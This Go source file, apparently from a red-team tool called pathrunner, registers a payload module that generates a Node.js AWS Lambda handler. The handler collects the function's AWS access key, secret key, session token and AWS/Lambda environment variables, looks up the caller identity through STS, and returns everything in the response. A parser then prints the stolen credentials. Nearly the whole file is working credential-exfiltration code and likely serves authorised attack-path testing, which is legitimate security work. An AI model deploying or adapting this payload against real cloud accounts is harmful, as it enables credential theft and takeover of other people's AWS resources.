// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package lambda

import (
	"encoding/json"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type ExfilResponseNodejsPayload struct{}

func init() {
	_ = payloads.Register(&ExfilResponseNodejsPayload{})
}

func (p *ExfilResponseNodejsPayload) GetName() string {
	return "exfil/response-nodejs"
}

func (p *ExfilResponseNodejsPayload) GetDescription() string {
	return "Extract credentials via Node.js and return them in the Lambda function response"
}

func (p *ExfilResponseNodejsPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguageNodeJS,
		payloads.TagTechniqueExfil,
		payloads.TagTransportResponse,
	}
}

func (p *ExfilResponseNodejsPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "INCLUDE_ENV",
			Description: "Include Lambda environment variables in output",
			Required:    false,
			Default:     "true",
		},
	}
}

func (p *ExfilResponseNodejsPayload) GenerateCode(options map[string]string) (string, error) {
	includeEnv := options["INCLUDE_ENV"] != "false"

	envCode := ""
	if includeEnv {
		envCode = `
    // Include AWS and Lambda environment variables
    const envVars = {};
    for (const [k, v] of Object.entries(process.env)) {
      if (k.startsWith('AWS_') || k.startsWith('LAMBDA_')) {
        envVars[k] = v;
      }
    }
    result.environment = envVars;`
	}

	code := `'use strict';

exports.handler = async (event, context) => {
  const result = {
    message: 'Pathrunner credential exfiltration',
    requestId: context.awsRequestId,
  };

  try {
    // Credentials are always available as env vars in Lambda execution context
    result.credentials = {
      access_key_id: process.env.AWS_ACCESS_KEY_ID,
      secret_access_key: process.env.AWS_SECRET_ACCESS_KEY,
      session_token: process.env.AWS_SESSION_TOKEN,
    };
    result.region = process.env.AWS_REGION || process.env.AWS_DEFAULT_REGION;

    // Resolve caller identity via SDK — try v3 first, fall back to v2
    try {
      const { STSClient, GetCallerIdentityCommand } = require('@aws-sdk/client-sts');
      const stsClient = new STSClient({});
      const identity = await stsClient.send(new GetCallerIdentityCommand({}));
      result.caller_identity = {
        account: identity.Account,
        arn: identity.Arn,
        user_id: identity.UserId,
      };
    } catch (_sdkV3Err) {
      try {
        const AWS = require('aws-sdk');
        const sts = new AWS.STS();
        const identity = await sts.getCallerIdentity().promise();
        result.caller_identity = {
          account: identity.Account,
          arn: identity.Arn,
          user_id: identity.UserId,
        };
      } catch (_sdkV2Err) {
        result.caller_identity = { error: 'STS unavailable' };
      }
    }
` + envCode + `

    result.status = 'success';
  } catch (err) {
    result.status = 'error';
    result.error = err.message;
  }

  return { statusCode: 200, body: JSON.stringify(result, null, 2) };
};
`
	return code, nil
}

func (p *ExfilResponseNodejsPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Credential Exfiltration Results (Node.js) ===\n\n")

	if status, ok := parsedBody["status"].(string); ok && status == "error" {
		if errorMsg, ok := parsedBody["error"].(string); ok {
			output.WriteString("ERROR: " + errorMsg + "\n")
		}
		return output.String(), nil
	}

	if callerIdentity, ok := parsedBody["caller_identity"].(map[string]interface{}); ok {
		output.WriteString("Caller Identity:\n")
		if account, ok := callerIdentity["account"].(string); ok {
			output.WriteString("  Account: " + account + "\n")
		}
		if arn, ok := callerIdentity["arn"].(string); ok {
			output.WriteString("  ARN: " + arn + "\n")
		}
		if userID, ok := callerIdentity["user_id"].(string); ok {
			output.WriteString("  User ID: " + userID + "\n")
		}
		output.WriteString("\n")
	}

	if credentials, ok := parsedBody["credentials"].(map[string]interface{}); ok {
		output.WriteString("Extracted Credentials:\n")
		if accessKey, ok := credentials["access_key_id"].(string); ok {
			output.WriteString("  AWS_ACCESS_KEY_ID=" + accessKey + "\n")
		}
		if secretKey, ok := credentials["secret_access_key"].(string); ok {
			output.WriteString("  AWS_SECRET_ACCESS_KEY=" + secretKey + "\n")
		}
		if sessionToken, ok := credentials["session_token"].(string); ok {
			output.WriteString("  AWS_SESSION_TOKEN=" + sessionToken + "\n")
		}
		output.WriteString("\n")
	}

	if region, ok := parsedBody["region"].(string); ok {
		output.WriteString("Region: " + region + "\n\n")
	}

	if env, ok := parsedBody["environment"].(map[string]interface{}); ok {
		output.WriteString("Environment Variables:\n")
		for key, value := range env {
			if strValue, ok := value.(string); ok {
				output.WriteString("  " + key + "=" + strValue + "\n")
			}
		}
		output.WriteString("\n")
	}

	return output.String(), nil
}

func (p *ExfilResponseNodejsPayload) Validate(options map[string]string) error {
	return nil
}
